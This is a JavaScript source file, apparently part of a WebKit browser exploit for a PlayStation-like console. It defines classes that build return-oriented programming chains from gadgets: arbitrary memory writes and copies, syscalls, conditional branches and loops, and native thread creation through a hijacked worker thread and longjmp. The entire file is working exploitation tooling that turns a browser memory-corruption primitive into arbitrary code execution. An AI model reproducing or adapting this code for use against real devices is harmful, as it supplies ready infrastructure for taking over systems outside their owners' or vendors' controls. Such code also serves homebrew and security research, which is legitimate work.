// @ts-check

class rop {
    /**
     * 
     * @param {WebkitPrimitives} p 
     * @param {number} [stack_size] 
     * @param {number} [reserved_stack] 
     */
    constructor(p, stack_size = 0x80000, reserved_stack = 0x10000) {
        this.stack_size = stack_size;
        this.reserved_stack = reserved_stack;
        this.stack_dwords = stack_size / 0x4;
        this.reserved_stack_index = this.reserved_stack / 0x4;

        this.stack_memory = p.malloc(this.stack_dwords + 0x2 + 0x200);
        this.stack_array = this.stack_memory.backing;
        this.zeroed_stack = new Uint32Array(this.stack_dwords);

        this.stack_entry_point = this.stack_memory.add32(this.reserved_stack);
        this.return_value = this.stack_memory.add32(this.stack_size);
        this.initial_count = 0;
        this.count = 0;

        this.p = p;

        this.gadgets = p.gadgets;
        this.syscalls = p.syscalls;

        this.branches = this.return_value.add32(0x8);
        this.branches_count = 0;

        this.branch_types = {
            EQUAL: 0x314500,
            ABOVE: 0x314501,
            BELOW: 0x314502,
            GREATER: 0x314503,
            LESSER: 0x314504,
        };

    }

    /** @param {number} count */
    set_initial_count(count) {
        this.initial_count = count;
        if (this.count == 0) {
            this.count = this.initial_count;
        }
    }

    clear() {
        this.count = this.initial_count;
        this.branches_count = 0;
        // this is faster than using fill(0) (for 0x20000 elem u32 array (avg from 100 runs): js-loop: ~29.99ms, fill: ~4.48ms, set: ~0.04ms)
        this.stack_array.set(this.zeroed_stack);
    }

    increment_stack() {
        return this.count++;
    }

    /**
     * sets a stack entry to a value
     * @param {number} index
     * @param {int64|number} value
     */
    set_entry(index, value) {
        if (value instanceof int64) {
            this.stack_array[this.reserved_stack_index + index * 2] = value.low;
            this.stack_array[this.reserved_stack_index + index * 2 + 1] = value.hi;
        } else if (typeof (value) == 'number') {
            this.stack_array[this.reserved_stack_index + index * 2] = value;
            this.stack_array[this.reserved_stack_index + index * 2 + 1] = 0x0;
            if (value > 0xFFFFFFFF) {
                alert("you're trying to write a value exceeding 32-bits without using a int64 instance");
            }
        } else {
            alert("You're trying to write a non number/non int64 value?");
        }
    }

    /**
     * performs `*rsp = value; rsp += 8;`
     * @param {int64|number} value
     */
    push(value) {
        this.set_entry(this.increment_stack(), value);
    }

    /**
     * performs `*dest = value;` in chain
     * @param {int64|number} dest
     * @param {int64|number} value
     */
    push_write4(dest, value) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["pop rax"]);
        this.push(value);
        this.push(this.gadgets["mov [rdi], eax"]);
    }

    /**
     * performs `*dest = value;` in chain
     * @param {int64|number} dest
     * @param {int64|number} value
     */
    push_write8(dest, value) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["pop rsi"]);
        this.push(value);
        this.push(this.gadgets["mov [rdi], rsi"]);
    }

    /**
     * performs `*dest = *src;` in chain
     * @param {int64|number} dest
     * @param {int64|number} src
     */
    push_copy8(dest, src) {
        this.push(this.gadgets["pop rax"]);
        this.push(src);
        this.push(this.gadgets["mov rax, [rax]"]);
        this.push_set_reg_from_rax("rsi");
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], rsi"]);
    }


    /**
     * performs `**dest = value;` in chain
     * @param {int64|number} dest
     * @param {int64|number} value
     */
    push_write_ptr8(dest, value) {
        this.push(this.gadgets["pop rax"]);
        this.push(value);
        this.push(this.gadgets["mov rax, [rax]"]);
        this.push_set_reg_from_rax("rsi");
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], rsi"]);
    }


    /**
     * performs `*dest = rax;` in chain
     * @param {int64|number} dest
     */
    write_result(dest) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], rax"]);
    }

    /**
     * performs `*dest = eax;` in chain
     * @param {int64|number} dest
     */
    write_result4(dest) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], eax"]);
    }

    /**
     * pushes rdi-r9 args on the stack for sysv calls
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     */
    push_sysv(rdi, rsi, rdx, rcx, r8, r9) {

        if (rdi != undefined) {
            this.push(this.gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(this.gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(this.gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(this.gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(this.gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(this.gadgets["pop r9"]);
            this.push(r9);
        }

    }

    /**
     * helper function to add a standard sysv call to the chain.
     * @param {int64|number} rip
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     */
    fcall(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
        if (this.stack_entry_point.add32(this.count * 0x8).low & 0x8) {
            this.push(this.gadgets["ret"]);
        }
        this.push(rip);
    }


    /**
     * @param {number} sysc
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     */
    add_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    /**
     * returns the current stack pointer.
     */
    get_rsp() {
        return this.stack_entry_point.add32(this.count * 0x8);
    }

    /**
     * performs `rsp = dest;` in chain.
     * can be used to 'jump' to different parts of a rop chain
     * @param {int64|number} dest
     */
    jmp_to_rsp(dest) {
        this.push(this.gadgets["pop rsp"]);
        this.push(dest);
    }

    /**
     * function intended to build a reusable 'syscall' chain.
     * Having a syscall return an error makes the stub perform a push rax, a call and a push rbp, this would usually corrupt the rop chain for later reuse
     * @param {number} sysc
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     */
    self_healing_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
        let restore_point = this.get_rsp();
        this.push(this.gadgets["ret"]);
        this.push(this.gadgets["ret"]);
        this.push(this.gadgets["ret"]);

        if (this.stack_entry_point.add32(this.count * 0x8).low & 0x8) {
            this.push(this.gadgets["ret"]);
            restore_point.add32inplace(0x8);
        }
        this.push(this.syscalls[sysc]);
        this.push_write8(restore_point, this.gadgets["ret"]);
        this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
        this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
        this.push_write8(restore_point.add32(0x18), this.syscalls[sysc]);
    }

    /**
     * clobbers rdi
     * https://github.com/shahrilnet/remote_lua_loader/blob/5a15cc14eab0967e0ebd78dbe3a0f8ad9e747646/savedata/ropchain.lua#L356
     * @param {string} target_reg 
    */
   push_set_reg_from_rax(target_reg) {
        const disp = 0x20;
        const addr = this.get_rsp().add32(disp);
        this.push(this.gadgets["pop rdi"]);
        this.push(addr);
        this.push(this.gadgets["mov [rdi], rax"]);

        switch (target_reg) {
            case "rdi":
                this.push(this.gadgets["pop rdi"]);
                this.push(0);
                break;
            case "rsi":
                this.push(this.gadgets["pop rsi"]);
                this.push(0);
                break;
            case "rdx":
                this.push(this.gadgets["pop rdx"]);
                this.push(0);
                break;
            case "rcx":
                this.push(this.gadgets["pop rcx"]);
                this.push(0);
                break;
            case "r8":
                this.push(this.gadgets["pop r8"]);
                this.push(0);
                break;
            case "r9":
                this.push(this.gadgets["pop r9"]);
                this.push(0);
                break;
            default:
                alert("Unsupported target register: " + target_reg);
        }
    }

    /**
     * @param {number} sysc
     * @param {int64|number} [rdi]
     * @param {boolean} [deref_rdi]
     * @param {int64|number} [rsi]
     * @param {boolean} [deref_rsi]
     * @param {int64|number} [rdx]
     * @param {boolean} [deref_rdx]
     * @param {int64|number} [rcx]
     * @param {boolean} [deref_rcx]
     * @param {int64|number} [r8]
     * @param {boolean} [deref_r8]
     * @param {int64|number} [r9]
     * @param {boolean} [deref_r9]
     */
    self_healing_syscall_2(sysc, rdi = undefined, deref_rdi = false, rsi = undefined, deref_rsi = false, rdx = undefined, deref_rdx = false, rcx = undefined, deref_rcx = false, r8 = undefined, deref_r8 = false, r9 = undefined, deref_r9 = false) {

        if (rsi !== undefined) {
            if (deref_rsi) {
                this.push(this.gadgets["pop rax"]);
                this.push(rsi);
                this.push(this.gadgets["mov rax, [rax]"]);
                this.push_set_reg_from_rax("rsi");
            } else {
                this.push(this.gadgets["pop rsi"]);
                this.push(rsi);
            }
        }

        if (rdx !== undefined) {
            if (deref_rdx) {
                this.push(this.gadgets["pop rax"]);
                this.push(rdx);
                this.push(this.gadgets["mov rax, [rax]"]);
                this.push_set_reg_from_rax("rdx");
            } else {
                this.push(this.gadgets["pop rdx"]);
                this.push(rdx);
            }
        }

        if (rcx !== undefined) {
            if (deref_rcx) {
                this.push(this.gadgets["pop rax"]);
                this.push(rcx);
                this.push(this.gadgets["mov rax, [rax]"]);
                this.push_set_reg_from_rax("rcx");
            } else {
                this.push(this.gadgets["pop rcx"]);
                this.push(rcx);
            }
        }

        if (r8 !== undefined) {
            if (deref_r8) {
                this.push(this.gadgets["pop rax"]);
                this.push(r8);
                this.push(this.gadgets["mov rax, [rax]"]);
                this.push_set_reg_from_rax("r8");
            } else {
                this.push(this.gadgets["pop r8"]);
                this.push(r8);
            }
        }

        if (r9 !== undefined) {
            if (deref_r9) {
                this.push(this.gadgets["pop rax"]);
                this.push(r9);
                this.push(this.gadgets["mov rax, [rax]"]);
                this.push_set_reg_from_rax("r9");
            } else {
                this.push(this.gadgets["pop r9"]);
                this.push(r9);
            }
        }

        // Hack
        if (rdi !== undefined) {
            if (deref_rdi) {
                this.push(this.gadgets["pop rax"]);
                this.push(rdi);
                this.push(this.gadgets["mov rax, [rax]"]);
                this.push_set_reg_from_rax("rdi");
            } else {
                this.push(this.gadgets["pop rdi"]);
                this.push(rdi);
            }
        }

        let restore_point = this.get_rsp();
        this.push(this.gadgets["ret"]);
        this.push(this.gadgets["ret"]);
        this.push(this.gadgets["ret"]);

        if (this.stack_entry_point.add32(this.count * 0x8).low & 0x8) {
            this.push(this.gadgets["ret"]);
            restore_point.add32inplace(0x8);
        }
        this.push(this.syscalls[sysc]);
        this.push_write8(restore_point, this.gadgets["ret"]);
        this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
        this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
        this.push_write8(restore_point.add32(0x18), this.syscalls[sysc]);
    }


    /**
     * performs `*dest = *dest + value;` in chain
     * @param {int64|number} dest
     * @param {int64|number} value
     */
    push_inc8(dest, value) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["pop rax"]);
        this.push(dest);
        this.push(this.gadgets["mov rax, [rax]"]);
        this.push(this.gadgets["pop rcx"]);
        this.push(value);
        this.push(this.gadgets["add rax, rcx"]);
        this.push(this.gadgets["mov [rdi], rax"]);
    }


    /**
     * performs `*dest = *dest + *value;` in chain
     * @param {int64} dest
     * @param {int64} value
     */
    push_add(dest, value) {
        // read value of dest
        this.push(this.gadgets["pop rax"]);
        this.push(dest);
        this.push(this.gadgets["mov rax, [rax]"]);

        // move rax -> rcx
        this.push_set_reg_from_rax("rcx");

        // read value of value
        this.push(this.gadgets["pop rax"]);
        this.push(value);
        this.push(this.gadgets["mov rax, [rax]"]);

        this.push(this.gadgets["add rax, rcx"]);

        // write result to dest
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], rax"]);
    }

    /**
     * returns the next available branch
     */
    get_branch() {
        return this.branches.add32(this.branches_count++ * 0x10);
    }


    /**
     * prepares a branch in the rop chain, for 32b comparisons on [addr] <-> compare value
     * use branch_types.XXXXX as type argument.
     * returns a ptr ptr for the branchpoints
     * use logical inversions for other jmp types. setne -> inverted sete, setbe -> inverted seta, ...
     * @param {number} type
     * @param {int64} value_address
     * @param {int64|number} compare_value
     * @param {boolean} [dereference_compare_value]
     */
    create_branch(type, value_address, compare_value, dereference_compare_value = false) {
        let branch_addr = this.get_branch();

        this.push(this.gadgets["pop rcx"]);
        this.push(value_address);
        this.push(this.gadgets["pop rax"]);
        this.push(compare_value);
        if (dereference_compare_value) {
            this.push(this.gadgets["mov rax, [rax]"]);
        }
        this.push(this.gadgets["cmp [rcx], eax"]);
        this.push(this.gadgets["pop rax"]);
        this.push(0);

        if (type == this.branch_types.EQUAL) {
            this.push(this.gadgets["sete al"]);
        } else if (type == this.branch_types.ABOVE) {
            this.push(this.gadgets["seta al"]);
        } else if (type == this.branch_types.BELOW) {
            this.push(this.gadgets["setb al"]);
        } else if (type == this.branch_types.GREATER) {
            this.push(this.gadgets["setg al"]);
        } else if (type == this.branch_types.LESSER) {
            this.push(this.gadgets["setl al"]);
        } else {
            alert("illegal branch type.");
        }

        this.push(this.gadgets["shl rax, 3"]);
        this.push(this.gadgets["pop rcx"]);
        this.push(branch_addr);
        this.push(this.gadgets["add rax, rcx"]);
        this.push(this.gadgets["mov rax, [rax]"]);
        this.push(this.gadgets["pop rdi"]);
        let branch_pointer_pointer_idx = this.increment_stack();
        this.push(this.gadgets["mov [rdi], rax"]);
        this.push(this.gadgets["pop rsp"]);
        let branch_pointer = this.get_rsp();
        this.increment_stack();

        this.set_entry(branch_pointer_pointer_idx, branch_pointer);

        return branch_addr;
    }

    /**
     * *dst = *src * 0x4000
     * @param {int64} src
     * @param {int64} dst
     */
    multiply_by_0x4000(src, dst) {
        this.push(this.gadgets["pop rax"]);
        this.push(src);
        this.push(this.gadgets["mov rax, [rax]"]);

        this.push(this.gadgets["shl rax, 4"]);
        this.push(this.gadgets["shl rax, 4"]);
        this.push(this.gadgets["shl rax, 3"]);
        this.push(this.gadgets["shl rax, 3"]);

        this.push(this.gadgets["pop rdi"]);
        this.push(dst);
        this.push(this.gadgets["mov [rdi], rax"]);
    }

    // /**
    //  * *dst = *src / 0x4000
    //  * @param {int64} src
    //  * @param {int64} dst
    //  */
    // divide_by_0x4000(src, dst) {
    //     this.push(this.gadgets["pop rax"]);
    //     this.push(src);
    //     this.push(this.gadgets["mov rax, [rax]"]);

    //     this.push(this.gadgets["shr rax, 4"]);
    //     this.push(this.gadgets["shr rax, 4"]);
    //     this.push(this.gadgets["shr rax, 3"]);
    //     this.push(this.gadgets["shr rax, 3"]);

    //     this.push(this.gadgets["pop rdi"]);
    //     this.push(dst);
    //     this.push(this.gadgets["mov [rdi], rax"]);
    // }

    /**
     * finalizes a branch by setting the destination stack pointers.
     * swap met and not met args if trying for an inverted jmp type.
     * @param {int64} branch_addr
     * @param {int64} rsp_condition_met
     */
    set_branch_points(branch_addr, rsp_condition_met, rsp_condition_not_met) {
        this.p.write8(branch_addr.add32(0x0), rsp_condition_not_met);
        this.p.write8(branch_addr.add32(0x8), rsp_condition_met);
    }

    /**
     * @param {int64} value_address 
     * @param {number} type 
     * @param {int64|number} compare_value 
     * @param {boolean} dereference_compare_value
     * @param {function} body 
     */
    if(value_address, type, compare_value, dereference_compare_value, body) {
        let branch = this.create_branch(type, value_address, compare_value, dereference_compare_value);
        let met = this.get_rsp();
        body();
        let not_met = this.get_rsp();
        this.set_branch_points(branch, met, not_met);
    }

    /**
     * @param {int64} value_address 
     * @param {number} type 
     * @param {int64|number} compare_value 
     * @param {boolean} dereference_compare_value
     * @param {function} body 
     */
    if_not(value_address, type, compare_value, dereference_compare_value, body) {
        let branch = this.create_branch(type, value_address, compare_value, dereference_compare_value);
        let not_met = this.get_rsp();
        body();
        let met = this.get_rsp();
        this.set_branch_points(branch, met, not_met);
    }

    
    /**
     * @param {int64} value_address 
     * @param {number} type 
     * @param {int64|number} compare_value 
     * @param {boolean} dereference_compare_value
     * @param {function} body 
     */
    while(value_address, type, compare_value, dereference_compare_value, body) {
        let loop = this.get_rsp();
        this.if(value_address, type, compare_value, dereference_compare_value, () => {
            body();
            this.jmp_to_rsp(loop);
        });
    }

    /**
     * @param {int64} value_address 
     * @param {number} type 
     * @param {int64|number} compare_value 
     * @param {boolean} dereference_compare_value
     * @param {function} body 
     */
    while_not(value_address, type, compare_value, dereference_compare_value, body) {
        let loop = this.get_rsp();
        this.if_not(value_address, type, compare_value, dereference_compare_value, () => {
            body();
            this.jmp_to_rsp(loop);
        });
    }



    /**
     * performs (*address)++; in chain
     * @param {int64} address
     */
    increment_dword(address) {
        this.push(this.gadgets["pop rax"]);
        this.push(address);
        this.push(this.gadgets["inc dword [rax]"]);
    }
}

//extension of the generic rop class intended to be used with the hijacked worker thread.
class worker_rop extends rop {
    /**
     * 
     * @param {WebkitPrimitives} p 
     * @param {number} [stack_size] 
     * @param {number} [reserved_stack] 
     */
    constructor(p, stack_size, reserved_stack) {
        super(p, stack_size, reserved_stack);
        this.p.pre_chain(this);
    }

    clear() {
        super.clear();
        this.p.pre_chain(this);
    }

    /**
     * @param {int64|number} rip
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     * @returns {Promise<int64>}
     */
    async call(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.return_value);
        await this.run();
        return this.p.read8(this.return_value);
    }

    /**
     * @param {int64|number} rip
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     * @returns {Promise<number>}
     */
    async call32(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result4(this.return_value);
        await this.run();
        return this.p.read4(this.return_value) << 0;
    }

    /**
     * @param {number} sysc
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     * @returns {Promise<int64>}
     */
    async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return await this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    /**
     * @param {number} sysc
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     * @returns {Promise<number>}
     */
    async syscall_int32(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return await this.call32(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }



    /**
     * @param {int64} retstore
     * @param {number} sysc
     * @param {int64|number} [rdi]
     * @param {int64|number} [rsi]
     * @param {int64|number} [rdx]
     * @param {int64|number} [rcx]
     * @param {int64|number} [r8]
     * @param {int64|number} [r9]
     */
    add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(retstore);
    }

    /** @returns {Promise} */
    async run() {
        await this.p.launch_chain(this);
        this.clear();
    }
}

class thread_rop extends rop {
    /**
     * 
     * @param {WebkitPrimitives} p 
     * @param {worker_rop} chain 
     * @param {string} name 
     * @param {number} [stack_size]
     * @param {number} [reserved_stack] 
     */
    constructor(p, chain, name = "rop_thread", stack_size, reserved_stack) {
        super(p, stack_size, reserved_stack);
        //we longjmp into the ropchain, longjmp overites the first entry stack entry with its own saved 'return address' this requires us to skip an entry.
        this.set_initial_count(1);
        this.chain = chain;

        //prepare lonjmp context
        p.write8(this.stack_memory, this.gadgets["ret"]); //ret address
        p.write8(this.stack_memory.add32(0x08), 0x0); //rbx
        p.write8(this.stack_memory.add32(0x10), this.stack_entry_point); //rsp
        p.write8(this.stack_memory.add32(0x18), 0x0); //rbp
        p.write8(this.stack_memory.add32(0x20), 0x0); //r12
        p.write8(this.stack_memory.add32(0x28), 0x0); //r13
        p.write8(this.stack_memory.add32(0x30), 0x0); //r14
        p.write8(this.stack_memory.add32(0x38), 0x0); //r15
        p.write4(this.stack_memory.add32(0x40), 0x37F); //fpu control word
        p.write4(this.stack_memory.add32(0x44), 0x9FE0); //mxcsr

        p.writestr(this.stack_memory.add32(0x50), name); //thr name


        this.tid = p.malloc(0x8);
        this.ptid = p.malloc(0x8);
        this.tiny_stack = p.malloc(0x400);
        this.tiny_tls = p.malloc(0x40);

        this.thr_new_args = p.malloc(0x80);
        p.write8(this.thr_new_args.add32(0x0), p.libSceLibcInternalBase.add32(OFFSET_lc_longjmp)); //fn
        p.write8(this.thr_new_args.add32(0x8), this.stack_memory); //arg
        p.write8(this.thr_new_args.add32(0x10), this.tiny_stack); //stack
        p.write8(this.thr_new_args.add32(0x18), 0x400); //stack sz
        p.write8(this.thr_new_args.add32(0x20), this.tiny_tls); //tls
        p.write8(this.thr_new_args.add32(0x28), 0x40); //tls sz
        p.write8(this.thr_new_args.add32(0x30), this.tid); //tid
        p.write8(this.thr_new_args.add32(0x38), this.ptid); //parent tid
        p.write8(this.thr_new_args.add32(0x40), 0); //flags
        p.write8(this.thr_new_args.add32(0x48), 0); //rtp
        p.write8(this.thr_new_args.add32(0x50), 0); //name ptr
        p.write8(this.thr_new_args.add32(0x58), 0); //unk
        p.write8(this.thr_new_args.add32(0x60), 0); //unk
    }


    clear() {
        super.clear();

        this.p.write8(this.stack_memory, this.gadgets["ret"]);
        this.p.write8(this.stack_memory.add32(0x08), 0x0);
        this.p.write8(this.stack_memory.add32(0x10), this.stack_entry_point);
        this.p.write8(this.stack_memory.add32(0x18), 0x0);
        this.p.write8(this.stack_memory.add32(0x20), 0x0);
        this.p.write8(this.stack_memory.add32(0x28), 0x0);
        this.p.write8(this.stack_memory.add32(0x30), 0x0);
        this.p.write8(this.stack_memory.add32(0x38), 0x0);
        this.p.write4(this.stack_memory.add32(0x40), 0x37F);
        this.p.write4(this.stack_memory.add32(0x44), 0x9FE0);

        // this.p.write8(this.tid, 0);
        // this.p.write8(this.ptid, 0);    
    }

    /**
     * returns created pthread_t as int64
     * @returns {Promise<int64>}
     */
    async spawn_thread() {
        //add pthread_exit((void*)0x44414544); -> "DEAD"
        this.fcall(this.p.libKernelBase.add32(OFFSET_lk_pthread_exit), 0x44414544);
        await this.chain.call(this.p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), this.stack_memory.add32(0x48), 0x0, this.p.libSceLibcInternalBase.add32(OFFSET_lc_longjmp), this.stack_memory, this.stack_memory.add32(0x50));
        return this.p.read8(this.stack_memory.add32(0x48));
    }


    spawn_thread_chain() {
        this.fcall(this.syscalls[431], 0); // SYS_THR_EXIT
        this.chain.add_syscall(455, this.thr_new_args, 0x68); // SYS_THR_NEW
    }
}